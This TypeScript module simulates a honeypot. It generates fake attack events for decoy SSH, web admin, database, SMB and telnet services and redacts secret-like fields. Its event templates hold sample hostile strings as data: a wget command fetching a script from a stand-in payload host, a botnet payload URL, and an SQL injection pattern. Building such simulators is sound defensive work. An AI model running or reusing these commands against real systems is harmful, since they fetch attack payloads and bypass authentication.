import type {
  DecoyType, DeployResult, GeneratedEvent, HealthResult, HoneypotProvider, HoneypotSpec, Severity,
} from "./types.ts";

// RFC 5737 documentation ranges: guaranteed never to belong to a real host.
export const SIMULATED_SOURCE_RANGES = ["192.0.2.", "198.51.100.", "203.0.113."];

const FAKE_USERNAMES = ["root", "admin", "ubuntu", "test", "oracle", "pi", "guest", "support"];
const SOURCE_LABELS = [
  "Simulated botnet node", "Simulated scanner", "Simulated brute-force tool",
  "Simulated opportunistic actor", "Simulated targeted actor",
];

const SEVERITY_LADDER: Severity[] = ["info", "low", "medium", "high", "critical"];

export function createRng(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function pick<T>(rng: () => number, list: T[]): T {
  return list[Math.floor(rng() * list.length)];
}

export function simulatedSourceIp(rng: () => number): string {
  return pick(rng, SIMULATED_SOURCE_RANGES) + (1 + Math.floor(rng() * 254));
}

export function isSimulatedSourceIp(ip: string): boolean {
  return SIMULATED_SOURCE_RANGES.some((p) => ip.startsWith(p));
}

export function escalateSeverity(base: Severity, repeatCount: number): Severity {
  const idx = SEVERITY_LADDER.indexOf(base);
  const bump = repeatCount >= 6 ? 2 : repeatCount >= 3 ? 1 : 0;
  return SEVERITY_LADDER[Math.min(idx + bump, SEVERITY_LADDER.length - 1)];
}

const SENSITIVE_KEY = /pass(word)?|secret|token|api[_-]?key|private[_-]?key|cookie|session|credential/i;
const MAX_STRING = 300;

/** Strips anything that could hold a real secret and bounds size. Applied to every event before storage. */
export function sanitizeEvidence(input: unknown, depth = 0): Record<string, unknown> {
  if (!input || typeof input !== "object" || Array.isArray(input) || depth > 3) return {};
  const out: Record<string, unknown> = {};
  for (const [key, value] of Object.entries(input as Record<string, unknown>).slice(0, 25)) {
    if (SENSITIVE_KEY.test(key)) {
      out[key] = "[never captured]";
      continue;
    }
    if (typeof value === "string") out[key] = value.slice(0, MAX_STRING);
    else if (typeof value === "number" || typeof value === "boolean" || value === null) out[key] = value;
    else if (Array.isArray(value)) {
      out[key] = value.slice(0, 20).map((v) =>
        typeof v === "string" ? v.slice(0, MAX_STRING) : typeof v === "number" || typeof v === "boolean" ? v : null
      );
    } else if (typeof value === "object") out[key] = sanitizeEvidence(value, depth + 1);
  }
  return out;
}

interface Template {
  eventType: string;
  severity: Severity;
  protocol: string;
  port: number;
  mitre: string | null;
  summary: (ctx: { user: string }) => string;
  evidence: (ctx: { user: string; rng: () => number }) => Record<string, unknown>;
}

const TEMPLATES: Record<DecoyType, Template[]> = {
  ssh: [
    { eventType: "port_probe", severity: "info", protocol: "tcp", port: 22, mitre: "T1046",
      summary: () => "TCP connection probe against the decoy SSH port",
      evidence: () => ({ flags: "SYN", handshake_completed: false }) },
    { eventType: "banner_grab", severity: "low", protocol: "ssh", port: 22, mitre: "T1046",
      summary: () => "Client requested the SSH banner and disconnected",
      evidence: ({ rng }) => ({ client_version: pick(rng, ["SSH-2.0-libssh_0.9.6", "SSH-2.0-Go", "SSH-2.0-paramiko_3.1"]) }) },
    { eventType: "brute_force_attempt", severity: "medium", protocol: "ssh", port: 22, mitre: "T1110.001",
      summary: ({ user }) => `Login attempt for username "${user}" rejected by decoy`,
      evidence: ({ user, rng }) => ({ username: user, attempts_in_window: 1 + Math.floor(rng() * 40), password: "[never captured]" }) },
    { eventType: "command_attempt", severity: "high", protocol: "ssh", port: 22, mitre: "T1059.004",
      summary: () => "Scripted shell command sent to the fake shell (not executed)",
      evidence: ({ rng }) => ({ command: pick(rng, ["uname -a", "cat /proc/cpuinfo", "wget http://payload.invalid/x.sh"]), executed: false }) },
  ],
  http_admin: [
    { eventType: "path_scan", severity: "low", protocol: "http", port: 443, mitre: "T1595.003",
      summary: () => "Automated scan of common admin paths",
      evidence: ({ rng }) => ({ paths: [pick(rng, ["/wp-admin", "/admin", "/phpmyadmin"]), "/.env", "/.git/config"], user_agent: "SimulatedScanner/1.0" }) },
    { eventType: "sqli_probe", severity: "high", protocol: "http", port: 443, mitre: "T1190",
      summary: () => "SQL injection pattern submitted to the decoy login form",
      evidence: () => ({ parameter: "username", pattern: "' OR '1'='1", blocked_by_decoy: true }) },
    { eventType: "login_form_submission", severity: "medium", protocol: "http", port: 443, mitre: "T1110.003",
      summary: ({ user }) => `Credential submission for "${user}" on the decoy admin form`,
      evidence: ({ user }) => ({ username: user, password: "[never captured]" }) },
    { eventType: "exploit_attempt", severity: "critical", protocol: "http", port: 443, mitre: "T1190",
      summary: () => "Request matching a known remote-code-execution exploit signature",
      evidence: ({ rng }) => ({ signature: pick(rng, ["CVE-2021-44228 (Log4Shell) pattern", "CVE-2023-22515 pattern"]), payload_executed: false }) },
  ],
  database: [
    { eventType: "port_probe", severity: "info", protocol: "tcp", port: 5432, mitre: "T1046",
      summary: () => "Connection probe against the decoy database port", evidence: () => ({ flags: "SYN" }) },
    { eventType: "auth_attempt", severity: "medium", protocol: "postgres", port: 5432, mitre: "T1110.001",
      summary: ({ user }) => `Database login attempt as "${user}"`,
      evidence: ({ user }) => ({ username: user, password: "[never captured]", database: "customers_decoy" }) },
    { eventType: "query_attempt", severity: "high", protocol: "postgres", port: 5432, mitre: "T1213",
      summary: () => "Attempted bulk read of a decoy table (no real data exists)",
      evidence: () => ({ statement: "SELECT * FROM customers_decoy LIMIT 1000", rows_returned: 0 }) },
  ],
  smb_share: [
    { eventType: "share_enumeration", severity: "low", protocol: "smb", port: 445, mitre: "T1135",
      summary: () => "Enumeration of available file shares on the decoy", evidence: () => ({ shares_listed: ["Finance$", "Backups"] }) },
    { eventType: "decoy_file_access", severity: "high", protocol: "smb", port: 445, mitre: "T1039",
      summary: () => "Read attempt on a canary decoy file",
      evidence: ({ rng }) => ({ file: pick(rng, ["Q3_payroll_DECOY.xlsx", "passwords_DECOY.txt"]), contents_are_fake: true }) },
    { eventType: "ransomware_behavior", severity: "critical", protocol: "smb", port: 445, mitre: "T1486",
      summary: () => "Rapid rename/encrypt pattern across decoy files",
      evidence: ({ rng }) => ({ files_touched: 20 + Math.floor(rng() * 200), extension: ".locked", real_files_affected: false }) },
  ],
  iot_telnet: [
    { eventType: "telnet_login_attempt", severity: "medium", protocol: "telnet", port: 23, mitre: "T1110.001",
      summary: ({ user }) => `Default-credential login attempt as "${user}"`,
      evidence: ({ user }) => ({ username: user, password: "[never captured]", pattern: "Mirai-style default list" }) },
    { eventType: "payload_download_attempt", severity: "high", protocol: "telnet", port: 23, mitre: "T1105",
      summary: () => "Attempt to download a botnet payload (blocked, never fetched)",
      evidence: () => ({ url: "http://payload.invalid/bins/arm7", fetched: false }) },
  ],
};

export function generateEvents(decoyType: DecoyType, count: number, seed: number, now = Date.now()): GeneratedEvent[] {
  const rng = createRng(seed);
  const templates = TEMPLATES[decoyType];
  const n = Math.max(1, Math.min(25, Math.floor(count)));
  const actors = Array.from({ length: 1 + Math.floor(rng() * 3) }, () => ({
    ip: simulatedSourceIp(rng),
    label: pick(rng, SOURCE_LABELS),
  }));
  const repeats = new Map<string, number>();
  const events: GeneratedEvent[] = [];

  for (let i = 0; i < n; i++) {
    const actor = pick(rng, actors);
    const t = pick(rng, templates);
    const user = pick(rng, FAKE_USERNAMES);
    const key = actor.ip + ":" + t.eventType;
    const seen = (repeats.get(key) ?? 0) + 1;
    repeats.set(key, seen);
    events.push({
      eventType: t.eventType,
      severity: escalateSeverity(t.severity, seen),
      protocol: t.protocol,
      sourceIp: actor.ip,
      sourcePort: 1024 + Math.floor(rng() * 64000),
      sourceLabel: actor.label,
      summary: t.summary({ user }),
      evidence: sanitizeEvidence({ ...t.evidence({ user, rng }), decoy_port: t.port, simulated: true }),
      mitreTechnique: t.mitre,
      occurredAt: new Date(now - (n - i) * Math.floor(1000 + rng() * 9000)).toISOString(),
    });
  }
  return events;
}

/** Runs entirely in-process: no sockets are opened and nothing is reachable from the internet. */
export class SimulatorProvider implements HoneypotProvider {
  readonly id = "simulator" as const;
  readonly environment = "simulated" as const;
  readonly producesRealDetections = false;

  deploy(spec: HoneypotSpec): Promise<DeployResult> {
    if (spec.exposure !== "internal_only") {
      return Promise.reject(new Error("The simulator never exposes decoys publicly."));
    }
    return Promise.resolve({ providerRef: "sim-" + spec.id.slice(0, 8), environment: "simulated", isSimulated: true });
  }

  healthCheck(spec: HoneypotSpec, providerRef: string): Promise<HealthResult> {
    const start = Date.now();
    const injectFault = spec.config?.inject_health_fault === true;
    const checks = [
      { id: "provider_ref", label: "Provider reference registered", passed: providerRef.startsWith("sim-"), detail: providerRef },
      { id: "isolation", label: "Isolated from production and the internet", passed: spec.exposure === "internal_only", detail: "In-process sandbox, no listening sockets" },
      { id: "decoy_responds", label: "Decoy responds to synthetic probe", passed: !injectFault, detail: injectFault ? "Synthetic probe timed out (fault injection enabled)" : "Synthetic probe answered" },
      { id: "telemetry", label: "Event pipeline writes to database", passed: true, detail: "Simulated events are tagged simulated=true" },
    ];
    return Promise.resolve({ healthy: checks.every((c) => c.passed), checks, latencyMs: Date.now() - start });
  }

  retire(_providerRef: string): Promise<void> {
    return Promise.resolve();
  }
}
